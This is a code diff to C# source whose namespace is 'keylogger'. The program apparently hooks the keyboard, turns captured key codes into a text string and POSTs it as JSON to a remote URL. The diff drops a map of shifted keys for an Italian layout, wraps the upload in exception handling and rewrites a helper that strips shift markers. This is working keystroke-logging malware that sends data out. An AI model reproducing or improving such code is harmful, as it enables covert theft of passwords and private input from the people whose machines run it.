@@ -2,6 +2,7 @@
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Net;
+using System.Runtime.Serialization;
 
 
 namespace keylogger
@@ -64,32 +65,7 @@ namespace keylogger
 			{"RShiftKey", "[shift]" },
             {"LShiftKey", "[shift]" },
         };
-		private static Dictionary<string, string> shiftedKeys = new Dictionary<string, string>
-		{
-			{"0", "="},
-			{"1", "!"},
-			{"2", "\""},
-			{"3", "£"},
-			{"4", "$"},
-			{"5", "%"},
-			{"6", "&"},
-			{"7", "/"},
-			{"8", "("},
-			{"9", ")"},
-            {"'", "?"},
-            {"ì", "^"},
-            {"è", "é"},
-            {"+", "*"},
-            {"ò", "ç"},
-            {"à", "°"},
-            {"ù", "§"},
-            {",", ";"},
-            {".", ":"},
-            {"-", "_"},
-			{"<", ">" },
-			{"\\", "|" }
-        };
-
+		
         public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
 		{
 			
@@ -124,27 +100,43 @@ namespace keylogger
 
             using (WebClient client = new WebClient())
             {
-                client.Headers[HttpRequestHeader.ContentType] = "application/json";
+				try
+				{
+					client.Headers[HttpRequestHeader.ContentType] = "application/json";
 
-                // Converti l'oggetto JSON in una stringa
-                string jsonString = Newtonsoft.Json.JsonConvert.SerializeObject(jsonData);
+					// Converti l'oggetto JSON in una stringa
+					string jsonString = Newtonsoft.Json.JsonConvert.SerializeObject(jsonData);
 
-                // Invia la richiesta POST
-                string response = client.UploadString(url, "POST", jsonString);
+					// Invia la richiesta POST
+					string response = client.UploadString(url, "POST", jsonString);
+				}
+                catch (WebException ex)
+                {
+					// Handle WebExceptions (network errors, server responses, etc.)
+					Console.WriteLine(ex.ToString());
+                }
+                catch (SerializationException ex)
+                {
+                    Console.WriteLine(ex.ToString());
+                }
+                catch (Exception ex)
+                {
+                    // Handle other unexpected exceptions
+                    Console.WriteLine(ex.ToString());
+                }
             }
         }
 
 		private static void InsertKey(int vkCode)
 		{
 
-			//checkShifted();
 			if (dizionario.ContainsKey($"{(Keys)vkCode}"))
 				actualString += dizionario[$"{(Keys)vkCode}"];
 			else
 			{
 				if ($"{(Keys)vkCode}" == "Back")
 				{
-					if (actualString.Length != 0)
+					if (!string.IsNullOrEmpty(actualString))
 						actualString = actualString.Remove(actualString.Length - 1);	
 				}
 				else
@@ -152,17 +144,26 @@ namespace keylogger
 					actualString += $"{(Keys)vkCode}";
 				}
 			}
+			
+			
 
 			
 			Console.WriteLine(actualString);
 		}
 
-        private static void checkShifted()
+        private static bool checkShifted()
         {
-			if (actualString.Substring(Math.Max(0, actualString.Length - 7)) == "[shift]")
-			{
+            if (string.IsNullOrEmpty(actualString))
+                return false;
 
-			}
+            int shiftIndex = actualString.IndexOf("[shift]", Math.Max(0, actualString.Length - 7));
+            if (shiftIndex >= 0)
+            {
+                actualString = actualString.Remove(shiftIndex, 7);
+                return true;
+            }
+
+            return false;
         }
 
         public delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);
